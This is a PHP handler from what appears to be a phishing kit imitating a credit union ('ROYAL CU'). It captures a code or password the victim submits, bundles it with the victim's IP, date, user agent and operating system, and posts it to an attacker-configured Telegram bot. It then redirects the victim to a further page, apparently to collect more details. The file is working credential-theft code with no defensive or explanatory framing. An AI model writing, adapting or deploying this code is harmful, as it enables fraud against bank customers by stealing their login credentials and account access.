<?php
session_start();
#error_reporting(0);
# Adding Settings
include('function.php');
include('../config.php');
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];
#
#$subject .= "❤️== ROYAL CU CODE FROM {$IP} ==❤️\n\n";

$msgtg = '
❤️== ROYAL CU CODE FROM {'.$IP.'} ==❤️

*🔓Password  * : `'.$_POST['code'].'`

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP='.$IP.'
*Date* : '.$date.'
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

#Send To Telegram
if ($settings['telegram'] == "1"){
  $data = $msgtg;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

header('Location: ../info.php')
?>